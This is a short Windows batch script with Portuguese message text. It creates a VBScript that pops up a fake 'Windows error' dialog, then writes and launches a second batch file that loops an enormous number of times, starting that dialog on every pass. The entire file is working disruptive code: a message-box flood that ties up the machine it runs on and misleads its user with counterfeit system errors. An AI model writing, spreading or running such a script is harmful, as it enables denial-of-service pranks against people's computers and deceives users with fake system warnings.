@echo off
echo/msgbox "Erro do Windows", vbcritical, "Erro!" > ILM.vbs
echo/For /l %%%%r in ^(1,1,1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000^) do ^(Start ILM.vbs^) > Teste.cmd
echo/Exit >> Teste.cmd
Start /separate Teste.cmd